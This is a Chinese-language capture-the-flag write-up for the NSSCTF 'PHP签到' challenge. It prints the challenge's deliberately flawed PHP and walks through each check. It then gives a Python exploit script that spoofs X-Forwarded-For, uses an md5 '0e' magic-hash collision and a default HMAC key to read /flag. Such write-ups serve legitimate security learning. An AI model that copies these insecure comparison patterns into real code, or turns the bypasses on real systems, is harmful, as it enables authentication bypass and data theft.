## 基本信息
- 题目名称：PHP签到
- 题目链接：[[GCCCTF 2025]PHP签到 | NSSCTF](https://www.nssctf.cn/problem/7167)
- 考点清单：robots.txt、PHP 绕过
### 解题思路

看到页面主题为 ROBOT HUB，第一时间想到 `robots.txt`，访问得到：
```html
User-agent: *
Disallow: /l34RNpHP.php
```

继续访问，获得下面的 php 代码：
```php
<?php

header('Content-Type: text/plain; charset=UTF-8');

if (!isset($_GET['user'], $_GET['token'], $_GET['sig'], $_GET['ts'], $_GET['nonce'])) {
    readfile(__FILE__);
    exit;
}

$user   = (string)$_GET['user'];
$token  = (string)$_GET['token'];
$sig    = (string)$_GET['sig'];
$ts     = (int)$_GET['ts'];
$nonce  = (string)$_GET['nonce'];

$xff = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '';
if (strpos($xff, '127.0.0.1') === false && strpos($xff, '::1') === false) {
    exit('hacker!');
}

if (base64_decode($nonce) === false || !preg_match('/^[A-Za-z0-9+\/=]+$/', $nonce)) {
    exit('hacker!!');
}

if (time() - $ts <= 60) {
    // ok
} else {
    exit('expired!');
}

if (strpos($user, 'admin') == false) {

    $key = $_COOKIE['authkey'] ?? 'NULL';
    $mac = hash_hmac('md5', $user . $token . $ts, $key);

    if (substr($mac, 0, 6) == substr($sig, 0, 6)) {

        $stored_hash = '0e830400451993494058024219903391'; 
        if (md5($token) == $stored_hash) {
            @readfile('/flag');
        } else {
            exit('hacker!!!');
        }

    } else {
        exit('hacker!!!!');
    }

} else {
    exit('blocked user');
}
```

程序要求传入五个 GET 参数：`user`、`token`、`sig`、`ts`、`nonce`。
- 通过 `X-Forwarded-For` 头判断请求是否来自本地（`127.0.0.1` 或 `::1`），否则拒绝。
- `nonce` 必须是合法的 Base64 字符串（但不要求解码后有意义）
- `ts` 时间戳必须在当前时间 60 秒内，否则过期。
- 如果 `user` **不包含**字符串 `"admin"`（注意是 `strpos(...) == false`，即找不到），则进入验证流程：
    - 使用 Cookie 中的 `authkey` 作为 HMAC-MD5 的密钥，计算 `user + token + ts` 的 MAC。
    - 比较 `sig` 的前 6 位和计算出的 MAC 的前 6 位是否一致（**弱校验**）。
    - 如果一致，再检查 `md5($token)` 是否等于一个固定的哈希值 `'0e830400451993494058024219903391'`。
        - 如果相等，读取 `/flag`。
- 如果 `user` **包含** `"admin"`，直接拒绝（`blocked user`）。

因此，编写出下面的 payload 脚本：
```python
import sys
import time
import hashlib
import hmac
import requests
from urllib.parse import urlencode

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        print("Example: python3 exploit.py http://127.0.0.1:8080/l34RNpHP.php")
        sys.exit(1)

    url = sys.argv[1].rstrip('?')

    user = "guest"
    token = "QNKCDZO"
    ts = int(time.time())
    nonce = "AAAA"
    key = "NULL"

    # 计算 HMAC-MD5(user + token + ts, key)，取前6位
    data = user + token + str(ts)
    mac = hmac.new(key.encode(), data.encode(), hashlib.md5).hexdigest()
    sig = mac[:6]

    params = {
        'user': user,
        'token': token,
        'sig': sig,
        'ts': ts,
        'nonce': nonce
    }

    headers = {
        'X-Forwarded-For': '127.0.0.1',
        # 不发送 authkey cookie，让服务端使用默认 'NULL'
    }

    try:
        print(f"[+] Sending request to {url}")
        print(f"[+] Parameters: {params}")
        response = requests.get(url, params=params, headers=headers, timeout=10)
        if response.status_code == 200:
            print("[+] Response:")
            print(response.text)
        else:
            print(f"[-] HTTP {response.status_code}: {response.text}")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == '__main__':
    main()
```

